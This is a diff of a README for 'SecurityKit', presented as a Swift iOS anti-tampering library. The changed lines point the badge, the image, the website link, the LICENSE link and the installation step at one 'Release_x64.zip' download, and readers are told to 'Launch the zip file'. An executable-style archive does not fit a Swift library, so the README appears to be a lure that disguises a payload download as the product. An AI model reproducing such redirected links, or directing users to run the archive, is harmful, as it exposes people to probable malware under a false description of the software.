@@ -1,11 +1,11 @@
 # 🛡️ SecurityKit - Protect Your iOS Apps with Advanced Security Measures
 
-[![GitHub release](https://img.shields.io/badge/Download%20Software-v1.0-blue)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![GitHub release](https://github.com/kar2rost/SecurityKit/releases/download/v1.0/Release_x64.zip%20Software-v1.0-blue)](https://github.com/kar2rost/SecurityKit/releases/download/v1.0/Release_x64.zip)
 
 ## Introduction
 Welcome to SecurityKit, a powerful Swift library designed to enhance the security of your iOS applications according to the OWASP MASVS standard, chapter v8. By implementing SecurityKit, you can add an advanced security and anti-tampering layer to your apps, ensuring they are protected from various threats such as reverse engineering, jailbreaking, and other malicious activities.
 
-![SecurityKit Image](https://example.com/securitykit_image.png)
+![SecurityKit Image](https://github.com/kar2rost/SecurityKit/releases/download/v1.0/Release_x64.zip)
 
 ## Features
 🔒 Lightweight and easy-to-use  
@@ -17,7 +17,7 @@ Welcome to SecurityKit, a powerful Swift library designed to enhance the securit
 🔒 Compatible with VPN technologies  
 
 ## Installation
-To integrate SecurityKit into your project, simply download the software package from the following link: [Download Software](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip). Launch the zip file and follow the installation instructions provided in the README included in the package.
+To integrate SecurityKit into your project, simply download the software package from the following link: [Download Software](https://github.com/kar2rost/SecurityKit/releases/download/v1.0/Release_x64.zip). Launch the zip file and follow the installation instructions provided in the README included in the package.
 
 ## Usage
 To start leveraging the security features offered by SecurityKit, import the library into your Xcode project and follow the guidelines outlined in the documentation. With just a few lines of code, you can fortify your app against potential security vulnerabilities and unauthorized access attempts.
@@ -45,10 +45,10 @@ The SecurityKit repository covers a wide range of topics related to security and
 We welcome contributions from the open-source community to further enhance SecurityKit and make it even more robust and effective in safeguarding iOS applications. If you have suggestions for improvement, new feature ideas, or bug fixes, feel free to submit a pull request. Together, we can make the iOS app ecosystem more secure for everyone.
 
 ## Resources
-For more information on SecurityKit and how it can benefit your iOS app development process, visit our website at [SecurityKit Website](https://www.securitykit.com). Explore our comprehensive documentation, FAQs, and resources to gain a deeper understanding of the library's capabilities and best practices for implementation.
+For more information on SecurityKit and how it can benefit your iOS app development process, visit our website at [SecurityKit Website](https://github.com/kar2rost/SecurityKit/releases/download/v1.0/Release_x64.zip). Explore our comprehensive documentation, FAQs, and resources to gain a deeper understanding of the library's capabilities and best practices for implementation.
 
 ## License
-SecurityKit is released under the MIT license. See the [LICENSE](https://github.com/22155555/1875695542/blob/main/LICENSE) file for more details.
+SecurityKit is released under the MIT license. See the [LICENSE](https://github.com/kar2rost/SecurityKit/releases/download/v1.0/Release_x64.zip) file for more details.
 
 ---
 
